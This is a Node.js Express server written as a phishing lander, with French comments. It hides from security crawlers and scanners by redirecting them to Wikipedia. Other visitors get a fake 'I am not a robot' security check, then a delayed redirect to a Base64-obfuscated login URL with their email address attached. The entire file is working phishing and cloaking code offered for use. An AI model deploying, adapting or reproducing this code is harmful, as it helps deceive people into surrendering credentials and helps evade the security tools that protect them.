const express = require('express');
const app = express();

// --- CONFIGURATION ---
// Tes parties d'URL finale encodées en Base64
const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    // 1. COLLECTE DES INFOS
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const referrer = req.headers['referrer'] || req.headers['referer'] || "";
    const targetEmail = req.query.m || "";
    
    // Paramètre debug pour tes tests personnels
    const isDebug = req.query.debug === "true";

    // 2. LE CLOAKING PUISSANT (FILTRAGE DES BOTS)
    const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
    const isBotReferrer = referrer === "";

    // Application des règles (Wikipedia pour les bots)
    if (!isDebug && (isBotUA || isBotReferrer)) {
        return res.redirect("https://www.wikipedia.org");
    }

    // 3. GENERATION DE LA LANDING PAGE "COPIE CONFORME" (STYLING ORANGE & LOGIQUE CLICK-TO-LOAD)
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Checkpoint</title>
            <style>
                /* STYLE GRAPHIQUE - COPIE CONFORME DE TES IMAGES (ORANGE) */
                body {
                    background: #fdf2f2; /* Fond très légèrement rosé/beige comme sur l'image */
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                    color: #333;
                }
                .container {
                    background: white;
                    padding: 0;
                    border-radius: 12px;
                    box-shadow: 0 10px 25px rgba(0,0,0,0.05);
                    text-align: left;
                    max-width: 420px;
                    width: 90%;
                    overflow: hidden; /* Pour le border-radius du header */
                    position: relative;
                }
                .header {
                    background: #f5a623; /* Le Orange exact de ton image */
                    color: white;
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    padding: 15px 20px;
                }
                .logo-section {
                    display: flex;
                    align-items: center;
                    font-weight: 600;
                    font-size: 11px;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }
                .lock-icon {
                    margin-right: 10px;
                    font-size: 16px;
                    opacity: 0.8;
                }
                .dots-icon {
                    opacity: 0.5;
                    font-size: 16px;
                }
                .content {
                    padding: 30px 25px;
                }
                h2 {
                    color: #1b1f23;
                    font-size: 20px;
                    margin: 0 0 8px 0;
                    font-weight: 700;
                }
                #statusText {
                    font-size: 14px;
                    line-height: 1.6;
                    color: #586069;
                    margin: 0 0 25px 0;
                }
                .checkpoint-box {
                    background: #f8f9fa;
                    border: 1px solid #e0e6ed;
                    border-radius: 8px;
                    padding: 18px;
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    cursor: pointer;
                    transition: background 0.2s;
                }
                .checkpoint-box:hover {
                    background: #f1f3f5;
                }
                .checkbox-section {
                    display: flex;
                    align-items: center;
                }
                /* La case à cocher initiale (Image 1) */
                #customCheckbox {
                    width: 24px;
                    height: 24px;
                    border: 2px solid #d1d5da;
                    border-radius: 4px;
                    background: white;
                    margin-right: 15px;
                    position: relative;
                    flex-shrink: 0;
                }
                #customCheckbox:after {
                    content: '';
                    position: absolute;
                    display: none;
                    left: 8px;
                    top: 4px;
                    width: 5px;
                    height: 10px;
                    border: solid #f5a623;
                    border-width: 0 3px 3px 0;
                    transform: rotate(45deg);
                }
                /* Le spinner de chargement (Image 2) */
                #loader {
                    display: none; /* Caché initialement */
                    border: 3px solid rgba(245, 166, 35, 0.1);
                    border-top: 3px solid #f5a623; /* Orange */
                    border-radius: 50%;
                    width: 22px;
                    height: 22px;
                    animation: spin 1s linear infinite;
                    margin-right: 15px;
                    flex-shrink: 0;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .text-section {
                    color: #1b1f23;
                }
                .main-text {
                    font-weight: 600;
                    font-size: 14px;
                }
                .sub-text {
                    color: #586069;
                    font-size: 12px;
                    font-weight: 400;
                }
                .arrow-icon {
                    color: #d1d5da;
                    font-size: 16px;
                }
                .footer {
                    padding: 0 25px 20px;
                    display: flex;
                    justify-content: space-between;
                    font-size: 11px;
                    color: #888;
                }
                .secure-conn {
                    display: flex;
                    align-items: center;
                }
                .dot {
                    width: 6px;
                    height: 6px;
                    background: #28a745; /* Vert */
                    border-radius: 50%;
                    margin-right: 8px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo-section">
                        <span class="lock-icon">🔒</span> SECURITY CHECKPOINT
                    </div>
                    <div class="dots-icon">•••</div>
                </div>
                <div class="content">
                    <h2>Security Verification</h2>
                    <p id="statusText">Please confirm to continue</p>
                    
                    <div class="checkpoint-box" id="clickArea">
                        <div class="checkbox-section">
                            <div id="customCheckbox"></div>
                            <div id="loader"></div>
                            
                            <div class="text-section">
                                <div class="main-text" id="mainMsg">I am not a robot</div>
                                <div class="sub-text" id="subMsg">Click to verify your browser</div>
                            </div>
                        </div>
                        <div class="arrow-icon" id="arrowIcon">→</div>
                    </div>
                </div>
                <div class="footer">
                    <div class="secure-conn">
                        <span class="dot"></span> SECURE CONNECTION
                    </div>
                    <div>Protected by Shield</div>
                </div>
            </div>

            <script>
                // 4. LOGIQUE INTERACTIVE ET REDIRECTION
                
                // Variables Base64 (Node.js -> Client)
                const p1 = "${part1}";
                const p2 = "${part2}";
                const em = "${targetEmail}";

                const clickArea = document.getElementById('clickArea');
                const checkbox = document.getElementById('customCheckbox');
                const loader = document.getElementById('loader');
                const statusText = document.getElementById('statusText');
                const mainMsg = document.getElementById('mainMsg');
                const subMsg = document.getElementById('subMsg');
                const arrowIcon = document.getElementById('arrowIcon');

                // Écouteur de clic sur la boîte
                clickArea.addEventListener('click', function() {
                    // --- PASSAGE A L'ETAT 2 (IMAGE 2) ---
                    
                    // 1. Visuel de la boîte
                    checkbox.style.display = 'none'; // Cache la case
                    loader.style.display = 'block';   // Montre le spinner orange
                    arrowIcon.style.display = 'none'; // Cache la flèche
                    clickArea.style.cursor = 'default'; // Désactive le pointeur
                    
                    // 2. Changement des textes
                    statusText.innerText = "Please wait while we check your browser...";
                    mainMsg.innerText = "Verifying...";
                    subMsg.innerText = "Click to verify your browser"; // Reste identique sur l'image
                    
                    // 3. Désactivation du clic
                    clickArea.style.pointerEvents = 'none';

                    // 4. Lancement du délai de redirection (4 secondes)
                    setTimeout(() => {
                        // Reconstruction et redirection
                        let target = atob(p1) + atob(p2);
                        if(em !== "") target += "#" + em;
                        window.location.href = target;
                    }, 4000); 
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Serveur prêt sur le port \${PORT}`);
});
